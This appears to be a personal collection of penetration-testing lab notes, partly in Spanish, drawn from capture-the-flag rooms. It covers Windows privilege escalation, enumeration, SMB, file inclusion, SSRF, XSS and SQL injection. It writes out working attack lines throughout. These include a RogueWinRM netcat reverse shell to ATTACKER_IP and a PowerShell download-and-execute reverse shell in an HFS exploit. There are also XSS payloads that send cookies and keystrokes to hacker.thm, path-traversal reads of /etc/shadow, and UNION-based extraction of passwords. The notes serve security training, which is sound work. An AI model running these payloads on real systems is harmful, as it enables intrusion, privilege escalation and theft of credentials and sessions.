Let's assume we have an FTP service running with user ftp. Without impersonation, if user Ann logs into the FTP server and tries to access her files, the FTP service would try to access them with its access token rather than Ann's:

FTP server without impersonation

There are several reasons why using ftp's token is not the best idea: - For the files to be served correctly, they would need to be accessible to the ftp user. In the example above, the FTP service would be able to access Ann's files, but not Bill's files, as the DACL in Bill's files doesn't allow user ftp. This adds complexity as we must manually configure specific permissions for each served file/directory. - For the operating system, all files are accessed by user ftp, independent of which user is currently logged in to the FTP service. This makes it impossible to delegate the authorisation to the operating system; therefore, the FTP service must implement it. - If the FTP service were compromised at some point, the attacker would immediately gain access to all of the folders to which the ftp user has access.

If, on the other hand, the FTP service's user has the SeImpersonate or SeAssignPrimaryToken privilege, all of this is simplified a bit, as the FTP service can temporarily grab the access token of the user logging in and use it to perform any task on their behalf:

FTP server with impersonation

Now, if user Ann logs in to the FTP service and given that the ftp user has impersonation privileges, it can borrow Ann's access token and use it to access her files. This way, the files don't need to provide access to user ftp in any way, and the operating system handles authorisation. Since the FTP service is impersonating Ann, it won't be able to access Jude's or Bill's files during that session.

As attackers, if we manage to take control of a process with SeImpersonate or SeAssignPrimaryToken privileges, we can impersonate any user connecting and authenticating to that process.

In Windows systems, you will find that the LOCAL SERVICE and NETWORK SERVICE ACCOUNTS already have such privileges. Since these accounts are used to spawn services using restricted accounts, it makes sense to allow them to impersonate connecting users if the service needs. Internet Information Services (IIS) will also create a similar default account called "iis apppool\defaultapppool" for web applications.

To elevate privileges using such accounts, an attacker needs the following: 1. To spawn a process so that users can connect and authenticate to it for impersonation to occur. 2. Find a way to force privileged users to connect and authenticate to the spawned malicious process.

We will use RogueWinRM exploit to accomplish both conditions.

Let's start by assuming we have already compromised a website running on IIS and that we have planted a web shell on the following address:

http://10.10.199.94/

We can use the web shell to check for the assigned privileges of the compromised account and confirm we hold both privileges of interest for this task:

Webshell impersonate privileges

To use RogueWinRM, we first need to upload the exploit to the target machine. For your convenience, this has already been done, and you can find the exploit in the C:\tools\ folder.

The RogueWinRM exploit is possible because whenever a user (including unprivileged users) starts the BITS service in Windows, it automatically creates a connection to port 5985 using SYSTEM privileges. Port 5985 is typically used for the WinRM service, which is simply a port that exposes a Powershell console to be used remotely through the network. Think of it like SSH, but using Powershell.

If, for some reason, the WinRM service isn't running on the victim server, an attacker can start a fake WinRM service on port 5985 and catch the authentication attempt made by the BITS service when starting. If the attacker has SeImpersonate privileges, he can execute any command on behalf of the connecting user, which is SYSTEM.

Before running the exploit, we'll start a netcat listener to receive a reverse shell on our attacker's machine:
Kali Linux

user@attackerpc$ nc -lvp 4442

        

And then, use our web shell to trigger the RogueWinRM exploit using the following command:

c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"

RogueWinRM exploit execution

Note: The exploit may take up to 2 minutes to work, so your browser may appear as unresponsive for a bit. This happens if you run the exploit multiple times as it must wait for the BITS service to stop before starting it again. The BITS service will stop automatically after 2 minutes of starting.

The -p parameter specifies the executable to be run by the exploit, which is nc64.exe in this case. The -a parameter is used to pass arguments to the executable. Since we want nc64 to establish a reverse shell against our attacker machine, the arguments to pass to netcat will be -e cmd.exe ATTACKER_IP 4442.

If all was correctly set up, you should expect a shell with SYSTEM privileges:
Kali Linux

user@attackerpc$ nc -lvp 4442
Listening on 0.0.0.0 4442
Connection received on 10.10.175.90 49755
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>whoami
nt authority\system

        

Using any of the three methods discussed in this task, gain access to the Administrator's desktop and collect the flag. Don't forget to input the flag at the end of this task.

-=-=-
automated tools 
WinPEAS

WinPEAS is a script developed to enumerate the target system to uncover privilege escalation paths. You can find more information about winPEAS and download either the precompiled executable or a .bat script. WinPEAS will run commands similar to the ones listed in the previous task and print their output. The output from winPEAS can be lengthy and sometimes difficult to read. This is why it would be good practice to always redirect the output to a file, as shown below:
Command Prompt

           
C:\> winpeas.exe > outputfile.txt

        

WinPEAS can be downloaded here.


PrivescCheck

PrivescCheck is a PowerShell script that searches common privilege escalation on the target system. It provides an alternative to WinPEAS without requiring the execution of a binary file.

PrivescCheck can be downloaded here.

Reminder: To run PrivescCheck on the target system, you may need to bypass the execution policy restrictions. To achieve this, you can use the Set-ExecutionPolicy cmdlet as shown below.
Powershell

           
PS C:\> Set-ExecutionPolicy Bypass -Scope process -Force
PS C:\> . .\PrivescCheck.ps1
PS C:\> Invoke-PrivescCheck

        


WES-NG: Windows Exploit Suggester - Next Generation

Some exploit suggesting scripts (e.g. winPEAS) will require you to upload them to the target system and run them there. This may cause antivirus software to detect and delete them. To avoid making unnecessary noise that can attract attention, you may prefer to use WES-NG, which will run on your attacking machine (e.g. Kali or TryHackMe AttackBox).

WES-NG is a Python script that can be found and downloaded here.

Once installed, and before using it, type the wes.py --update command to update the database. The script will refer to the database it creates to check for missing patches that can result in a vulnerability you can use to elevate your privileges on the target system.

To use the script, you will need to run the systeminfo command on the target system. Do not forget to direct the output to a .txt file you will need to move to your attacking machine.

Once this is done, wes.py can be run as follows;
Kali Linux

user@kali$ wes.py systeminfo.txt


Metasploit

If you already have a Meterpreter shell on the target system, you can use the multi/recon/local_exploit_suggester module to list vulnerabilities that may affect the target system and allow you to elevate your privileges on the target system.


-=-=-=-=-=

gobuster dir -u http://<ip>:3333 -w <word list location>
GoBuster flag	Description
-e	Print the full URLs in your console
-u	The target URL
-w	Path to your wordlist
-U and -P	Username and Password for Basic Auth
-p <x>	Proxy to use for requests
-c <http cookies>	Specify a cookie for simulating your auth


-=-=-=-=-=
Samba Scan
Samba is the standard Windows interoperability suite of programs for Linux and Unix. It allows end users to access and use files, printers and other commonly shared resources on a companies intranet or internet. Its often referred to as a network file system.

Samba is based on the common client/server protocol of Server Message Block (SMB). SMB is developed only for Windows, without Samba, other computer platforms would be isolated from Windows machines, even if they were part of the same network
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse <ip>
nmap --script=smb-enum* >ip-addr< -oN smb_enum.nmap
#Other version being --scripts_file a file created by me
❯ nmap --script-args-file=scripts_file 10.10.175.107 -oN final
Vulnerable scan
nmap --script vuln -p 22,80,139,445,8009,8080 <ip>

-=-=-=-=-==
smbclient 
Send a message to the machine name pc04
  net send pc04 hi there
  smbclient -M

-=-=-=


List shares
  smbclient -L //bigserve -U usermark
  and the system would prompt me for a password. Alternatively, I could type
  smbclient -L //Bigserve -U Usermark%swordfish

##Ir a la ruta del recurso compartido y tirar de un aspx-reverse-shell 
  https://raw.githubusercontent.com/borjmz/aspx-reverse-shell/master/shell.aspx
psexec.py user:'password'@10.10.32.51

Lcd specifies the default directory on your workstation—the directory in which smbclient looks for the files you want to send and puts the files you've received. Cd specifies the default directory for the server. So, if you're connected to a share that contains a directory named mail, from which you want to copy some files to a directory named /mymailfiles on your local Linux box, you can set those directories as the default directories by typing

  cd mail
  lcd /mymailfiles

Here's one final hint about using smbclient. Sometime you might need to use smbclient on someone else's Linux system. If the system's owner has never used smbclient and hasn't created the smb.conf file, Linux can't check smb.conf for the WINS server's location, and consequently smbclient often can't find the Win2K or NT server that you're trying to connect to. (For an explanation of the smb.conf file, see "Connecting Linux Workstations to Windows 2000 and NT Servers.")

You can, of course, create an smb.conf file. But if you don't want to do that much work, you can lead smbclient by the nose to your Win2K or NT server with the -W and -I options. The -W option lets you enter a domain's name, and the -I option lets you specify the server's IP address. So, using my earlier example, if I knew that \\BIGSERVE had an IP address of 200.200.200.10 and that my usermark account was in the domain GUYS, I could invoke smbclient with the command

smbclient //bigserve/plans -I   200.200.200.10 -W guys -U usermark%swordfish
Download recursively
  smbget -R smb://10.10.175.107/Anonymous

#]#]#]#]Pending 
mkdir /mnt/kenobiNFS
mount machine_ip:/var /mnt/kenobiNFS
ls -la /mnt/kenobiNFS
--=-=-=-=-=-=
searchsploit 
searchsploit -t java #Por titulo
searchsploit -p 39166 #Copia al portapapeles
searchsploit -m 39166 #Ademas copia al directorio actual 
searchsploit -x 39166 #Examinar
searchsploit -x --nmap resultado.xml
searchsploit ubuntu 14.04 -w #Busqueda en exploit.db 
searchsploit ubuntu 14.10 -w --exclude="Linux Kernel"
searchsploit -c ProFTPD 1.3.5 #Case sensitive
-=-=-=-=-=-=-=
HFS (testing)
In the GET parameter
/?search=%00{.exec|C%3a\Windows\System32\WindowsPowerShell\v1.0\powershell.exe+ping+10.10.14.10.}
listen with tcpdump -i tun0 icmp
powershell iex (New-Object Net.WebClient).DownloadString('http://<yourwebserver>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.]
#URL encode the payload
#Transfer files from Windows to Linux. If we are using cmd
powershell -c "Invoke-WebRequest -Uri 'http://10.8.50.72:8000/winPEAS.bat' -OutFile 'C:\Users\bill\Desktop\winpeas.bat'"
powershell -c wget "http://10.10.118.24/winPEAS.exe" -outfile "winPEAS.exe"
#Windows escalation privilege 
  PS C:\Users\bill\Downloads> . .\PowerUp.ps1
  PS C:\Users\bill\Downloads> Invoke-AllChecks
-=-=-=-=-=-=-=-
Web Hacking

#View source code
Links to different pages in HTML are written in anchor tags ( these are HTML elements that start with <a ), and the link that you'll be directed to is stored in the href attribute.

#Against a paywall
The style we're interested in is the display: block. If you click on the word block, you can type a value of your own choice. Try typing none, and this will make the box disappear, revealing the content underneath it and a flag. If the element didn't have a display field, you could click below the last style and add in your own

#Using breakpoints
This little bit of JavaScript is what is removing the red popup from the page. We can utilise another feature of debugger called breakpoints. These are points in the code that we can force the browser to stop processing the JavaScript and pause the current execution.

#Robots.txt
The robots.txt file is a document that tells search engines which pages they are and aren't allowed to show on their search engine results or ban specific search engines from crawling the website altogether. It can be common practice to restrict certain website areas so they aren't displayed in search engine results. These pages may be areas such as administration portals or files meant for the website's customers. This file gives us a great list of locations on the website that the owners don't want us to discover as penetration testers.

#Sitemap.xml
Unlike the robots.txt file, which restricts what search engine crawlers can look at, the sitemap.xml file gives a list of every file the website owner wishes to be listed on a search engine. These can sometimes contain areas of the website that are a bit more difficult to navigate to or even list some old webpages that the current site no longer uses but are still working behind the scenes.

#favicon
do a curl to compare the hash against OWASP favicon database (https://wiki.owasp.org/index.php/OWASP_favicon_database)
curl https://static-labs.tryhackme.cloud/sites/favicon/images/favicon.ico | md5sum

#HTTP headers
curl http://10.10.125.127 -I

#OSINT
Filter
	Example
	Description

site
	site:tryhackme.com
	returns results only from the specified website address
        -site:www.tryhackme.com
        exclude any links to www.tryhackme.com. It shows us only subdomain names belonging to domain.com

inurl
	inurl:admin
	returns results that have the specified word in the URL

filetype
	filetype:pdf
	returns results which are a particular file extension

intitle
	intitle:admin
	returns results that contain the specified word in the title

others
inurl:"ViewerFrame?Mode=" will find public web cameras.
Another useful search is following intitle:index.of followed by a search keyword. This can give a list of files on the servers. For example, intitle:index.of mp3 will give all the MP3 files available on various types of servers. 

#OSINT - Wayback Machine
The Wayback Machine (https://archive.org/web/) is a historical archive of websites that dates back to the late 90s. You can search a domain name, and it will show you all the times the service scraped the web page and saved the contents. This service can help uncover old pages that may still be active on the current website.

#S3 Buckets
S3 Buckets are a storage service provided by Amazon AWS, allowing people to save files and even static website content in the cloud accessible over HTTP and HTTPS. The owner of the files can set access permissions to either make files public, private and even writable. Sometimes these access permissions are incorrectly set and inadvertently allow access to files that shouldn't be available to the public. The format of the S3 buckets is http(s)://{name}.s3.amazonaws.com where {name} is decided by the owner, such as tryhackme-assets.s3.amazonaws.com. S3 buckets can be discovered in many ways, such as finding the URLs in the website's page source, GitHub repositories, or even automating the process. One common automation method is by using the company name followed by common terms such as {name}-assets, {name}-www, {name}-public, {name}-private, etc.

#Automated
dirb http://10.10.125.127/ /usr/share/wordlists/SecLists/Discovery/Web-Content/common.TXT
gobuster dir --url http://10.10.125.127/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt

-=-=-=-=-
Subdomain enumeration
#SSL/TLS certificates
When an SSL/TLS (Secure Sockets Layer/Transport Layer Security) certificate is created for a domain by a CA (Certificate Authority), CA's take part in what's called "Certificate Transparency (CT) logs". These are publicly accessible logs of every SSL/TLS certificate created for a domain name. The purpose of Certificate Transparency logs is to stop malicious and accidentally made certificates from being used
  https://crt.sh/ 

#DNS Bruteforce 
dnsrecon -t brt -d acmeitsupport.thm

#Virtual hosts 
Because web servers can host multiple websites from one server when a website is requested from a client, the server knows which website the client wants from the Host header. We can utilise this host header by making changes to it and monitoring the response to see if we've discovered a new website.
ffuf -w /usr/share/seclists/Discovery/DNS/namelist.txt -H "Host:FUZZ.acmeitsupport.thm" -u http://10.10.80.215 -fs 2395


#Authentication Bypass 
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.70.209/customers/signup -mr "username already exists"

#Brute force 
ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.70.209/customers/login -fc 200

#Logic flaws
In the application, the user account is retrieved using the query string, but later on, in the application logic, the password reset email is sent using the data found in the PHP variable $_REQUEST.


The PHP $_REQUEST variable is an array that contains data received from the query string and POST data. If the same key name is used for both the query string and POST data, the application logic for this variable favours POST data fields rather than the query string, so if we add another parameter to the POST form, we can control where the password reset email gets delivered.
curl 'http://10.10.70.209/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'
curl 'http://10.10.70.209/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email={username}@customer.acmeitsupport.thm'

-=-=-=-=-=-
Cookie tampering
#Plain text
curl -H "Cookie: logged_in=true; admin=true" http://10.10.70.209/cookie-test
#Hashing
#encoding
Encoding is similar to hashing in that it creates what would seem to be a random string of text, but in fact, the encoding is reversible. So it begs the question, what is the point in encoding? Encoding allows us to convert binary data into human-readable text that can be easily and safely transmitted over mediums that only support plain text ASCII characters.

Common encoding types are base32 which converts binary data to the characters A-Z and 2-7, and base64 which converts using the characters a-z, A-Z, 0-9,+, / and the equals sign for padding.


Take the below data as an example which is set by the web server upon logging in:

Set-Cookie: session=eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ==; Max-Age=3600; Path=/
This string base64 decoded has the value of {"id":1,"admin": false} we can then encode this back to base64 encoded again but instead setting the admin value to true, which now gives us admin access.

-=-=-=-=-=-=-=
IDOR
giving you access to data that you shouldn't have.

-=--=-=-=-
File inclusion
#Path traversal
/etc/passwd or C:\boot.ini C:\windows\win.ini

Common OS files to test
Location	Description

/etc/issue	contains a message or system identification to be printed before the login prompt.

/etc/profile	controls system-wide default variables, such as Export variables, File creation mask (umask), Terminal types, Mail messages to indicate when new mail has arrived
/proc/version	specifies the version of the Linux kernel

/etc/passwd	has all registered user that has access to a system

/etc/shadow	contains information about the system's users' passwords

/root/.bash_history	contains the history commands for root user

/var/log/dmessage	contains global system messages, including the messages that are logged during system startup

/var/mail/root	all emails for root user
/root/.ssh/id_rsa	Private SSH keys for a root or any known valid user on the server
/var/log/apache2/access.log	the accessed requests for Apache  webserver
C:\boot.ini	contains the boot options for computers with BIOS firmware

=============
#LFI
Examples wih PHP
1. It works because there isn't a directory specified in the include function and no input validation.
http://webapp.thm/get.php?file=/etc/passwd
<?PHP 
	include($_GET["lang"]);
?>

2. If there is no input validation, the attacker can manipulate the URL by replacing the lang input with other OS-sensitive files such as /etc/passwd.
<?PHP 
	include("languages/". $_GET['lang']); 
?>

3. Using null bytes
Using null bytes is an injection technique where URL-encoded representation such as %00 or 0x00 in hex with user-supplied data to terminate strings. You could think of it as trying to trick the web app into disregarding whatever comes after the Null Byte.
The %00 trick is fixed and not working with PHP 5.3.4 and above.

4.In this section, the developer decided to filter keywords to avoid disclosing sensitive information! The /etc/passwd file is being filtered. There are two possible methods to bypass the filter. First, by using the NullByte %00 or the current directory trick at the end of the filtered keyword /.. The exploit will be similar to http://webapp.thm/index.php?lang=/etc/passwd/. We could also use http://webapp.thm/index.php?lang=/etc/passwd%00

5. The developer starts to use input validation by filtering some keywords. The web application replaces the ../ with the empty string. There are a couple of techniques we can use to bypass this.

First, we can send the following payload to bypass it: ....//....//....//....//....//etc/passwd

Why did this work?

This works because the PHP filter only matches and replaces the first subset string ../ it finds and doesn't do another pass,

6. The developer forces the include to read from a defined directory! For example, if the web application asks to supply input that has to include a directory such as: http://webapp.thm/index.php?lang=languages/EN.php then, to exploit this, we need to include the directory in the payload like so: ?lang=languages/../../../../../etc/passwd

========
#RFI
An external server must communicate with the application server for a successful RFI attack where the attacker hosts malicious files on their server. Then the malicious file is injected into the include function via HTTP requests, and the content of the malicious file executes on the vulnerable application server.

host vcs.fsf.org
    HostkeyAlgorithms +ssh-rsa
    PubkeyAcceptedAlgorithms +ssh-rsa

ssh -oHostKeyAlgorithms=+ssh-dss -i id_rsa root@<ip>
  OpenSSH since 7.0 doesn't accept hostkey ssh-dss and you must add it, similarly since 8.8 it doesn't use client ssh-rsa and you must add that with -oPubkeyAcceptedAlgorithms=+ssh-rsa.

-=-=-=-=-
SSRF
1. Modify URL
  Hacker request
    http://website.thm/stock?url=http://api.website.thm/api/user 
2. Path traversal 
    http://website.thm/stock?url=/../user
3. Server subdomain to wich the request is made
    http://website.thme/stock?server=api.website.thm/api/user&x=&id=123
    the payload ending in &x= is being used to stop the remaining path from being appended to the end of the attacker's URL and instead turns it into a paramter (?x=) on the query string

4. Change a value like in an avatar election with a payload like x/../private being private a directory interesting

#Defeating common SSRF 
Deny list
Attackers can bypass a Deny List by using alternative localhost references such as 0, 0.0.0.0, 0000, 127.1, 127.*.*.*, 2130706433, 017700000001 or subdomains that have a DNS record which resolves to the IP Address 127.0.0.1 such as 127.0.0.1.nip.io.

Also, in a cloud environment, it would be beneficial to block access to the IP address 169.254.169.254, which contains metadata for the deployed cloud server, including possibly sensitive information. An attacker can bypass this by registering a subdomain on their own domain with a DNS record that points to the IP Address 169.254.169.254


Allow List
An allow list is where all requests get denied unless they appear on a list or match a particular pattern, such as a rule that an URL used in a parameter must begin with https://website.thm. An attacker could quickly circumvent this rule by creating a subdomain on an attacker's domain name, such as https://website.thm.attackers-domain.thm. The application logic would now allow this input and let an attacker control the internal HTTP request.


Open Redirect

If the above bypasses do not work, there is one more trick up the attacker's sleeve, the open redirect. An open redirect is an endpoint on the server where the website visitor gets automatically redirected to another website address. Take, for example, the link https://website.thm/link?url=https://tryhackme.com. This endpoint was created to record the number of times visitors have clicked on this link for advertising/marketing purposes. But imagine there was a potential SSRF vulnerability with stringent rules which only allowed URLs beginning with https://website.thm/. An attacker could utilise the above feature to redirect the internal HTTP request to a domain of the attacker's choice.

-=-=-=-=-=-=-=
XSS 
PoC
  <script>alert('XSS');</script>
  <marquee>testing</marquee>
Stealing cookie
  <script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
    The </textarea> tag closes the textarea field. 
    The <script>tag opens open an area for us to write JavaScript.
    The fetch() command makes an HTTP request.
    {URL_OR_IP} is either the THM request catcher URL or your IP address from the THM AttackBox or your IP address on the THM VPN Network.
    ?cookie= is the query string that will contain the victim's cookies.
    btoa() command base64 encodes the victim's cookies.
    document.cookie accesses the victim's cookies for the Acme IT Support Website.
    </script>closes the JavaScript code block.
Keylogger
  <script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
This payload is a lot more specific than the above examples. This would be about calling a particular network resource or a JavaScript function. For example, imagine a JavaScript function for changing the user's email address called user.changeEmail(). Your payload could look like this:
  <script>user.changeEmail('attacker@hacker.thm');</script>

-----
Stored XSS
the XSS payload is stored on the web application (in a database, for example) and then gets run when other users visit the site or web page.

Example Scenario:
  A blog website that allows users to post comments. Unfortunately, these comments aren't checked for whether they contain JavaScript or filter out any malicious code. If we now post a comment containing JavaScript, this will be stored in the database, and every other user now visiting the article will have the JavaScript run in their browser.

-----
Blind XSS
Blind XSS is similar to a stored XSS in that your payload gets stored on the website for another user to view, but in this instance, you can't see the payload working or be able to test it against yourself first.

Example Scenario:

A website has a contact form where you can message a member of staff. The message content doesn't get checked for any malicious code, which allows the attacker to enter anything they wish. These messages then get turned into support tickets which staff view on a private web portal.

Potential Impact:

Using the correct payload, the attacker's JavaScript could make calls back to an attacker's website, revealing the staff portal URL, the staff member's cookies, and even the contents of the portal page that is being viewed. Now the attacker could potentially hijack the staff member's session and have access to the private portal.
xsshunter is a popular tool

-----
Reflected XSS
Example scenario
  A website where if you enter incorrect input, an error message is displayed. The content of the error message gets taken from the error parameter in the query string and is built directly into the page source.

Reflected XSS happens when user-supplied data in an HTTP request is included in the webpage source without any validation. The attacker could send links or embed them into an iframe on another website containing a JavaScript payload to potential victims getting them to execute code on their browser, potentially revealing session or customer information.
  https://website.thm/?error=<script src="https://attacker.thm/evil.js"></script>


-----
Exploiting the DOM

DOM Based XSS is where the JavaScript execution happens directly in the browser without any new pages being loaded or data submitted to backend code. Execution occurs when the website JavaScript code acts on input or user interaction.

Example Scenario:
  The website's JavaScript gets the contents from the window.location.hash parameter and then writes that onto the page in the currently being viewed section. The contents of the hash aren't checked for malicious code, allowing an attacker to inject JavaScript of their choosing onto the webpage.

DOM Based XSS can be challenging to test for and requires a certain amount of knowledge of JavaScript to read the source code. You'd need to look for parts of the code that access certain variables that an attacker can have control over, such as "window.location.x" parameters.

When you've found those bits of code, you'd then need to see how they are handled and whether the values are ever written to the web page's DOM or passed to unsafe JavaScript methods such as eval().


-----
Testing 
You can see your name reflected inside the value attribute of the input tag. "><script>alert('THM');</script>
With "> we close the value attribute

Other
  You'll have to escape the existing JavaScript command, so you're able to run your code; you can do this with the following payload ';alert('THM');//  which you'll see from the below screenshot will execute your code. The ' closes the field specifying the name, then ; signifies the end of the current command, and the // at the end makes anything after it a comment rather than executable code

<sscriptcript>alert('THM');</sscriptcript>
/images/cat.jpg" onload="alert('THM');

Polyglots:


An XSS polyglot is a string of text which can escape attributes, tags and bypass filters all in one. You could have used the below polyglot on all six levels you've just completed, and it would have executed the code successfully.
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e



-=-=-=-=-=-=-=-=
Command injection
The shell operators ;, |, & and && will combine two (or more) system commands and execute them both
sleep[in Linux]=timeout[in Windows]
https://github.com/payloadbox/command-injection-payload-list

--=-=-=-=-=
=-=-=-=-=-=
-=-=-=-=-=-=-=-=-=

SQL
A database is controlled by a DBMS which is an acronym for  Database Management System, DBMS's fall into two camps Relational or Non-Relational, the focus of this room will be on Relational databases,  some common one's you'll come across are MySQL, Microsoft SQL Server, Access, PostgreSQL and SQLite

Non-relational databases sometimes called NoSQL on the other hand is any sort of database that doesn't use tables, columns and rows to store the data, a specific database layout doesn't need to be constructed so each row of data can contain different information which can give more flexibility over a relational database.  Some popular databases of this type are MongoDB, Cassandra and ElasticSearch

It's worth noting that SQL syntax is not case sensitive.

Inside mysql (with credentials). An example
mysql -u wordpress -p 
show databases;
use phpmyadmin;
show tables;
describe usernames_table;

Example:
  select * from users;
    The semicolon at the end tells the database that this is the end of the query.  

  select * from users LIMIT 1;
    This query, like the first, returns all the columns by using the * selector and then the "LIMIT 1" clause forces the database only to return one row of data. Changing the query to "LIMIT 1,1" forces the query to skip the first result, and then "LIMIT 2,1" skips the first two results, and so on. You need to remember the first number tells the database how many results you wish to skip, and the second number tells the database how many rows to return.

  select * from users where username='admin';

  select * from users where username like 'a%';
    This returns any rows with username beginning with the letter a.

  select * from users where username like '%n';
    This returns any rows with username ending with the letter n.

  select * from users where username like '%mi%';
    This returns any rows with a username containing the characters mi within them.

  SELECT name,address,city,postcode from customers UNION SELECT company,address,city,postcode from suppliers;
    The UNION statement combines the results of two or more SELECT statements to retrieve data from either single or multiple tables; the rules to this query are that the UNION statement must retrieve the same number of columns in each SELECT statement, the columns have to be of a similar data type and the column order has to be the same. 

  insert into users (username,password) values ('bob','password123');
    The INSERT statement tells the database we wish to insert a new row of data into the table. "into users" tells the database which table we wish to insert the data into, "(username,password)" provides the columns we are providing data for and then "values ('bob','password');" provides the data for the previously specified columns

  update users SET username='root',password='pass123' where username='admin';
    The UPDATE statement tells the database we wish to update one or more rows of data within a table. You specify the table you wish to update using "update %tablename% SET" and then select the field or fields you wish to update as a comma-separated list such as "username='root',password='pass123'" then finally similar to the SELECT statement, you can specify exactly which rows to update using the where clause such as "where username='admin;".

  delete from users where username='martin';
    The DELETE statement tells the database we wish to delete one or more rows of data. Apart from missing the columns you wish to be returned, the format of this query is very similar to the SELECT. You can specify precisely which data to delete using the where clause and the number of rows to be deleted using the LIMIT clause.

  SELECT * from blog where id=1 and private=0 LIMIT 1;
    the SQL statement above is looking in the blog table for an article with the id number of 1 and the private column set to 0, which means it's able to be viewed by the public and limits the results to only one match


-=-=-=-=-=-
SQLi
   Let's pretend article id 2 is still locked as private, so it cannot be viewed on the website. We could now instead call the URL:
  https://website.thm/blog?id=2;--

  Which would then, in turn, produce the SQL statement:
  SELECT * from blog where id=2;-- and private=0 LIMIT 1;
  The semicolon in the URL signifies the end of the SQL statement, and the two dashes cause everything afterwards to be treated as a comment. By doing this, you're just, in fact, running the query:

  SELECT * from blog where id=2;--
  Which will return the article with an id of 2 whether it is set to public or notes

-----
In-Band SQL Injection
In-Band SQL Injection is the easiest type to detect and exploit; In-Band just refers to the same method of communication being used to exploit the vulnerability and also receive the results, for example, discovering an SQL Injection vulnerability on a website page and then being able to extract data from the database to the same page.


Error-Based SQL Injection
This type of SQL Injection is the most useful for easily obtaining information about the database structure as error messages from the database are printed directly to the browser screen. This can often be used to enumerate a whole database. 


Union-Based SQL Injection
  This type of Injection utilises the SQL UNION operator alongside a SELECT statement to return additional results to the page. This method is the most common way of extracting large amounts of data via an SQL Injection vulnerability.

  The key to discovering error-based SQL Injection is to break the code's SQL query by trying certain characters until an error message is produced; these are most commonly single apostrophes ( ' ) or a quotation mark ( " ).

  Try typing an apostrophe ( ' ) after the id=1 and press enter. And you'll see this returns an SQL error informing you of an error in your syntax. The fact that you've received this error message confirms the existence of an SQL Injection vulnerability. We can now exploit this vulnerability and use the error messages to learn more about the database structure. 

  The first thing we need to do is return data to the browser without displaying an error message. Firstly we'll try the UNION operator so we can receive an extra result of our choosing. Try setting the mock browsers id parameter to:
  1 UNION SELECT 1

  This statement should produce an error message informing you that the UNION SELECT statement has a different number of columns than the original SELECT query. So let's try again but add another column:
  1 UNION SELECT 1,2

  Same error again, so let's repeat by adding another column:
  1 UNION SELECT 1,2,3

  Success, the error message has gone, and the article is being displayed, but now we want to display our data instead of the article. The article is being displayed because it takes the first returned result somewhere in the web site's code and shows that. To get around that, we need the first query to produce no results. This can simply be done by changing the article id from 1 to 0.
  0 UNION SELECT 1,2,3

  You'll now see the article is just made up of the result from the UNION select returning the column values 1, 2, and 3. We can start using these returned values to retrieve more useful information. First, we'll get the database name that we have access to:
  0 UNION SELECT 1,2,database()
  You'll now see where the number 3 was previously displayed; it now shows the name of the database, which is sqli_one.

  Our next query will gather a list of tables that are in this database.
  0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'

  There are a couple of new things to learn in this query. Firstly, the method group_concat() gets the specified column (in our case, table_name) from multiple returned rows and puts it into one string separated by commas. The next thing is the information_schema database; every user of the database has access to this, and it contains information about all the databases and tables the user has access to. In this particular query, we're interested in listing all the tables in the sqli_one database, which is article and staff_users. 


  As the first level aims to discover Martin's password, the staff_users table is what is of interest to us. We can utilise the information_schema database again to find the structure of this table using the below query.
  0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'

  This is similar to the previous SQL query. However, the information we want to retrieve has changed from table_name to column_name, the table we are querying in the information_schema database has changed from tables to columns, and we're searching for any rows where the table_name column has a value of staff_users.

  The query results provide three columns for the staff_users table: id, password, and username. We can use the username and password columns for our following query to retrieve the user's information.
  0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users


  Again we use the group_concat method to return all of the rows into one string and to make it easier to read. We've also added ,':', to split the username and password from each other. Instead of being separated by a comma, we've chosen the HTML <br> tag that forces each result to be on a separate line to make for easier reading.


###Blind SQLi - Authentication Bypass

Authentication Bypass
One of the most straightforward Blind SQL Injection techniques is when bypassing authentication methods such as login forms. In this instance, we aren't that interested in retrieving data from the database; We just want to get past the login. 

Login forms that are connected to a database of users are often developed in such a way that the web application isn't interested in the content of the username and password but more whether the two make a matching pair in the users table. In basic terms, the web application is asking the database "do you have a user with the username bob and the password bob123?", and the database replies with either yes or no (true/false) and, depending on that answer, dictates whether the web application lets you proceed or not. 
Taking the above information into account, it's unnecessary to enumerate a valid username/password pair. We just need to create a database query that replies with a yes/true.

  We could use ' or 1=1;--

###Blind SQLi - Boolean based
admin123' UNION SELECT 1,2,3 where database() like '%';--

We get a true response because, in the like operator, we just have the value of %, which will match anything as it's the wildcard value. If we change the wildcard operator to a%, you'll see the response goes back to false, which confirms that the database name does not begin with the letter a. We can cycle through all the letters, numbers and characters such as - and _ until we discover a match. If you send the below as the username value, you'll receive a true response that confirms the database name begins with the letter s.

admin123' UNION SELECT 1,2,3 where database() like 's%';--

###Blind SQLi - Time based
referrer=admin123' UNION SELECT SLEEP(5),2 where database() like 'u%';--


-=-=-=-=-=-=
Burpsuite room
#Decoder


